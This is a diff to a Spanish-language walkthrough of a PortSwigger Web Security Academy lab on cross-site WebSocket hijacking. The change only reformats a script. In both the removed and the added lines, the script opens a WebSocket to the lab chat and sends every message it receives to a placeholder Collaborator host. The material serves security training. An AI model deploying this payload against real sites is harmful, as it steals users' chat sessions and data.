@@ -53,6 +53,8 @@ no necesitamos el atributo `chatForm.getAttribute("action")` ya que este será l
 <script> var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat'); 
 ws.onopen = function() { 
 	ws.send("READY"); 
-	}; ws.onmessage = function(event) {
-		 fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data}); }; </script>
+	}; 
+	ws.onmessage = function(event) {
+		 fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data}); }; 
+</script>
 ```
